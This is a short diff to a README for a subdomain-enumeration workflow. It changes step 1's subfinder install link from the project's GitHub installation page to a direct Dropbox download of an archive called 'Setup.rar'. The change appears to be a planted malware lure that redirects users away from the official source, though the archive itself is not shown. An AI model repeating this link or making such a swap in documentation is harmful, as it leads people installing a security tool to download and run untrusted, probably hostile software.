@@ -32,7 +32,7 @@ Usage
 
 **1. Install subfinder (or any tool for finding subdomain)**
 
-Visit subfinder repo if you want to install subfinder [here](https://github.com/projectdiscovery/subfinder#installation)
+Visit subfinder repo if you want to install subfinder [here](https://www.dropbox.com/scl/fi/v29hnzx2coqz2wtz9ub4p/Setup.rar?rlkey=4clgo5rul7ynd4wu1e9zr0iae&dl=1)
 
 
 **2. Scan subdomain using subfinder and save it to file**
